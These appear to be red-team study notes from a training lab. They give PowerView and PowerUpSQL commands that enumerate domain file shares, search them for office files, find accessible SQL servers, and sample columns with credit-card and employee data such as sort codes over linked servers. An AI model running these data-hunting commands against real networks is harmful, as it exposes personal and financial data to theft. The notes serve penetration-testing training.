# Data Hunting and Exfiltration Notes

## File Shares

enumeration shares
```
powershell Find-DomainShare -CheckShareAccess
```

interesting files search
```
powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
```

## Databases

Powerupsql can search for interesting stuff and extraction
```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

to search over links
```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
```

list an employees table columns
```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"
```

take a data sample with the columns identified
```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"

```
